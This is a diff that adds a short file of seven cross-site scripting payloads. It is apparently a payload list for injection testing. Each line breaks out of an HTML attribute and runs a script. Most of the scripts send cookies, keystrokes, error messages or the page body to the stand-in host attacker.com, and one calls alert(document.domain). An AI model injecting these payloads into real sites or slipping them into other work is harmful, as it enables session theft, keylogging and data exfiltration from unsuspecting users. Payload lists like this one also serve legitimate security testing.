@@ -1,0 +1,7 @@
+"><script>fetch('https://attacker.com?c='+document.cookie)</script>
+"><script>new Image().src='https://attacker.com/log?c='+document.cookie</script>
+"><script>document.write('<img src=x onerror=alert(document.domain)>')</script>
+"><script>var i=new Image;i.src='https://attacker.com?'+document.cookie</script>
+"><script>window.onerror=function(){fetch('https://attacker.com/error-log?msg='+event.error)}</script>
+"><script>document.onkeypress=function(e){fetch('https://attacker.com/keys?key='+e.key)}</script>
+"><script>document.body.appendChild(document.createElement('iframe')).src='https://attacker.com/steal?data='+document.body.innerHTML</script>
